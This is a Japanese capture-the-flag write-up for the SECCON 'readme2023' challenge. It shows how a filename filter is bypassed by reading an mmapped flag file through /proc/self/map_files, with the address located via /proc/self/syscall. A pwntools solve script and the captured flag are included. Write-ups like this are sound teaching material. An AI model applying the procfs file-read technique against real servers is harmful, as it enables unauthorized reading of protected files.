# readme2023

## 概要

指定したパスに置かれたファイルの中身を返してくれます。
0x100 文字で打ち切られてしまいます。
パスは`flag.txt`という文字列を含んではいけません。

## 観察

### mmap

```python
f = open("./flag.txt", "r")
mm = mmap.mmap(f.fileno(), 0, prot=mmap.PROT_READ)
```

`flag.txt`の中身がメモリにマッピングされています。

### `/proc`

`/proc` 以下に起動中のプロセスに関する情報がまとまっています。
参考：<https://linuxjm.osdn.jp/html/LDP_man-pages/man5/proc.5.html>

ローカルでDockerコンテナの中に入って、使えそうな情報を探していきます。
`server.py` の `signal.alarm(60)` の行はコメントアウトしておくと楽です。

```bash
❯ docker-compose exec dist_readme /bin/bash

  # 対象のプロセスを発見
  ctf@138474203cdc:~$ cat /proc/10/cmdline
  pythonserver.py

  # flag.txt をマップしている場所を発見
  ctf@138474203cdc:~$ cat /proc/10/maps
  ...
  7fa6a1319000-7fa6a131a000 r--s 00000000 fd:01 2663913                    /home/ctf/flag.txt
  ...

  # /proc/[pid]/map_files から読める
  ctf@24ad3b6ebb57:~$ ls -l /proc/10/map_files/
  ...
  lr-------- 1 ctf ctf 64 Sep 18 03:43 7fa6a1319000-7fa6a131a000 -> /home/ctf/flag.txt
  ...

# map_filesを指定してFLAG獲得
❯ nc localhost 2023
path: /proc/self/map_files/7fa6a1319000-7fa6a131a000
b'FAKECON{******* FIND ME ON REMOTE SERVER *******}\n'
```

リモートでも同じようなことをすれば良さそうです。
ただし、0x100文字で打ち切られてしまうので、別の方法でアドレスを特定する必要があります。
`flag.txt` をマッピングしているアドレスとの相対距離が一定であるようなアドレスがあれば嬉しいです。
`/proc/self/syscall` の情報が役立ちました。

```bash
# flag.txt がマップされているアドレス周辺の情報を探す
ctf@24ad3b6ebb57:~$ cat /proc/10/syscall
0 0x0 0x55aef731dea0 0x2000 0x2 0x0 0x0 0x7ffdce52a8d8 0x7fa6a122f07d
```

## 解法

```python
from pwn import *

io = remote("readme-2023.seccon.games", "2023")

io.sendlineafter(b"path:", b"/proc/self/syscall")
base_addr = int(eval(io.recvline()).split()[-1], 16)

l = base_addr - 0x7FA6A122F07D + 0x7FA6A1319000
r = l + (0x7F2B6C580000 - 0x7F2B6C57F000)

io.sendlineafter(b"path:", f"/proc/self/map_files/{hex(l)[2:]}-{hex(r)[2:]}".encode())
io.interactive()
#  b'SECCON{y3t_4n0th3r_pr0cf5_tr1ck:)}\n'
```
